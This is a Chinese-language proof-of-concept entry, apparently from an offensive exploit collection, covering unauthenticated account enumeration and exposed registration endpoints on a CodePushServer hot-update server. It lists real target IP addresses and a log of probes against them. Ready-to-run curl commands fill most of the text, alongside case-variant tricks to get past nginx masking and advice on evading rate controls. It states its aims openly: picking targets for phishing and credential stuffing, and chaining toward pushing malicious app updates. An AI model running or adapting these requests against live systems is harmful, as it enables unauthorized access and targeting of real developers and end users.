# CodePushServer GET /users/exists 零凭证账号存在性枚举 oracle + 未认证 registerCode/注册接口暴露

- **code**: codepushserver-users-exists-unauth-account-enum-registercode
- **kind**: poc
- **category**: info-leak
- **component**: CodePushServer（lisong/code-push-server，react-native / cordova 热更新服务）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#614，2026-11-05 21:42–21:52 GMT，本机 Windows curl.exe（Schannel）+ -k --noproxy '*' 直连 35.241.95.15:5432，UA=Chrome/130，只读探测共 7 发、间隔 15s。① GET /users/exists?email=<已注册的运营/开发邮箱> 无 Authorization/无 Cookie → HTTP 200 / 29B / {"status":"OK","exists":true}；② 同接口换本次自建未注册邮箱 → HTTP 200 / 30B / {"status":"OK","exists":false}，true/false 双分支稳定，证明是可用 oracle；③ 对照：无 token 访问 /apps 返回 {"status":401,"name":"UnauthorizedError"}（41B），说明该路由确实没挂鉴权中间件，而非全站放行；④ POST /users/registerCode（x-www-form-urlencoded，email=自建邮箱）→ HTTP 200 / 15B / {"status":"OK"}，随后 api.mail.tm 四轮轮询（间隔 20s）count=0 无验证码邮件；⑤ 上游 lisong/code-push-server master 的 routes/users.js、core/services/account-manager.js、email-manager.js 交叉确认：三个接口均无 middleware.checkToken，且 sendMail 在 smtpConfig 缺失时先 resolve({}) 故 200 但不发信。未取得任何 token 或 deploymentKey。
- **path**: pocs/codepushserver-users-exists-unauth-account-enum-registercode/poc.md
- **tags**: codepushserver, code-push-server, 热更新, 账号枚举, users/exists, exists oracle, registerCode, 未认证注册, 未挂鉴权, smtp未配置, info-leak, 邮箱枚举
- **created_at**: 2026-11-04T21:48:14.685Z
- **engine**: 35.241.95.15:5432（同族 35.220.211.187:5432、34.92.23.31:5432）

## 描述

CodePushServer 的账号体系接口（routes/users.js）默认不带鉴权中间件：GET /users/exists?email=<x> 对匿名者直接返回 {"status":"OK","exists":true|false}，构成零凭证、无频控迹象的邮箱账号存在性 oracle；POST /users/registerCode 与 POST /users（email+token+password）、GET /users/registerCode/exists 同样匿名可达。价值在于定向枚举热更服务器的运营/开发者邮箱，为钓鱼、撞库、社会工程选靶；注册链是否可完成取决于实例的 smtpConfig 是否配置。与同产品「nginx 遮蔽大小写绕过 /auth/Login」条目互补：那条打的是管理登录面，这条打的是账号体系 API 面。

## 用法

```
前置：目标端口可达（本例 5432/tcp，别被端口号误导成 PostgreSQL），HTTPS 自签需 curl -k --noproxy '*'；无需账号/Cookie/Authorization。
1) 先做鉴权基线：curl -k --noproxy '*' -s https://TARGET:PORT/apps → 期望 body {"status":401,"name":"UnauthorizedError"}（注意是这个框架把 401 写在 body、HTTP 仍是 200），说明鉴权中间件存在，从而反证 /users/* 是漏挂。
2) 打 oracle（单发对比，勿批量）：
   curl -k --noproxy '*' -s "https://TARGET:PORT/users/exists?email=<候选邮箱>"
   → {"status":"OK","exists":true} = 该邮箱已在热更服务器注册；{"status":"OK","exists":false} = 未注册。
   已知/自建邮箱各跑一次做双向对照，确认 true/false 都能出现再批量；建议间隔 ≥10s。
3) 发码面探测：curl -k --noproxy '*' -s -X POST https://TARGET:PORT/users/registerCode -H 'Content-Type: application/x-www-form-urlencoded' --data 'email=<自建邮箱>' → 200 {"status":"OK"} 只代表处理器可达；必须真去收信验证（本实例 smtpConfig 未配置，sendMail 直接 resolve，四轮轮询零邮件）。
4) 注册处理器（公开）：POST /users，参数 email / token / password；验证码校验口 GET /users/registerCode/exists。token 由 registerCode 生成 crypto 强随机 40 字符存 Redis，拿不到码就不要反复打，避免触发风控。
失败/误判常见原因：① 目标前置 nginx 对 /users/ 做了遮蔽，返回 561B openresty 固定页而非应用层 JSON —— 换大小写变体（/users/Exists、/Users/exists）再试，参照同产品 /auth/Login 绕过条目；② 实例为定制版已给 users.js 补了 checkToken，则匿名请求统一 401；③ 若已注册与未注册邮箱返回同型响应（都 STATUS:OK 无 exists 字段或都报错），枚举结论不成立；④ 只在配置了 smtpConfig 的实例上才可能走通完整注册链。
```

## 正文

```
# CodePushServer GET /users/exists 零凭证账号存在性枚举

## 0. 前提
- CodePushServer（lisong/code-push-server 系，fingerprint：`<title>CodePushServer</title>` + "react native / cordova hot update server"，Helmet 头齐全）。
- 目标端口可达（端口号任意，本例 5432，**不是** PostgreSQL）。
- HTTPS 自签：`curl -k --noproxy '*'`。
- 无需任何账号 / Cookie / Authorization。
- 单发、对照式探测，间隔 ≥10s，不要拿它去批量刷生产。

## 1. 鉴权基线（必须先做，用来反证"漏挂"而不是"全站放行"）
```bash
curl -k --noproxy '*' -s -o - -w '\n[%{http_code} %{size_download}]\n' https://TARGET:PORT/apps
```
实测：
```
{"status":401,"name":"UnauthorizedError"}
[200 41]
```
注意：**HTTP 状态码是 200，401 写在 body 里**（该框架风格）。这条基线成立，说明鉴权中间件在这个实例上确实生效，那么 `/users/*` 匿名可用就是漏挂。

## 2. 核心：账号存在性 oracle
```bash
# 已注册邮箱（脱敏）
curl -k --noproxy '*' -s "https://TARGET:PORT/users/exists?email=<REDACTED_EMAIL>"
# → 200 / 29B
# {"status":"OK","exists":true}

# 自建未注册邮箱
curl -k --noproxy '*' -s "https://TARGET:PORT/users/exists?email=probe_$(date +%s)@example.org"
# → 200 / 30B
# {"status":"OK","exists":false}
```
判据：
- `exists:true` → 该邮箱已在热更服务器注册（运营 / 开发者邮箱）。
- `exists:false` → 未注册（也可直接拿去当注册候选，不骚扰真实用户）。
- 双分支都能稳定出现，才认这是个可用 oracle。

## 3. 未认证的发码 / 注册接口
```bash
# 触发注册验证码
curl -k --noproxy '*' -s -X POST https://TARGET:PORT/users/registerCode \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'email=<自建邮箱>'
# → 200 / 15B
# {"status":"OK"}

# 验证码校验口（匿名可达）
curl -k --noproxy '*' -s "https://TARGET:PORT/users/registerCode/exists?email=<自建邮箱>&token=<40hex>"

# 注册处理器（匿名可达）
curl -k --noproxy '*' -s -X POST https://TARGET:PORT/users \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'email=<自建邮箱>&token=<40hex>&password=<REDACTED>'
```
上游源码（master）要点：
- `routes/users.js` 三个处理器均**没有** `middleware.checkToken`。
- `core/services/account-manager.js`：`sendRegisterCode` 生成 `crypto` 强随机 40 字符 token 写入 Redis，再调 `sendMail`。
- `core/services/email-manager.js`：`sendMail` 在 `smtpConfig` 缺失时**先 `resolve({})`** —— 所以接口回 200 `{"status":"OK"}` 但根本不发信。

## 4. 判据表
| 观察 | 结论 |
|---|---|
| `/apps` 无 token → body `{"status":401,"name":"UnauthorizedError"}` | 鉴权基线有效 |
| `/users/exists` 已注册邮箱 → `exists:true` | 账号存在 |
| `/users/exists` 未注册邮箱 → `exists:false` | 账号不存在；oracle 成立 |
| `/users/registerCode` → 200 `{"status":"OK"}` 且目标邮箱无来信 | 处理器可达但 SMTP 未配置，注册链断 |
| `/users/registerCode` → 200 且真收到 40 字符 token 邮件 | 可继续走 `/users` 完成注册（此时按需谨慎，勿留持久账号） |
| `/users/*` 返回 561B openresty 固定页 | 被前置 nginx 遮蔽，换大小写变体 |

## 5. 边界与本轮结论（诚实记录）
- 拿到：任意邮箱是否注册（双向可判），可批量但需限速。
- 未拿到：任何 token、任何 deploymentKey、任何生产应用数据。注册链因 `smtpConfig` 未配置不可完成。
- 危害面：运营 / 开发者邮箱可被定向枚举 → 钓鱼、撞库选靶、社工。本身是 low，但与 `/auth/Login`（同产品另一条目）组合后指向"拿到发布权限 → 推任意热更包 → 客户端代码执行"的最终目标。

## 6. 证伪条件
- 带/不带凭据、已注册/未注册四种组合返回同型响应（统一 `{"status":"ERROR"}` 或统一 401）→ 枚举不成立。
- 实例为定制版已给 `users.js` 补 `checkToken` → 匿名 401。
- 返回 openresty 561B 固定页 → 路由被遮蔽，不是不存在；换大小写再判。

```
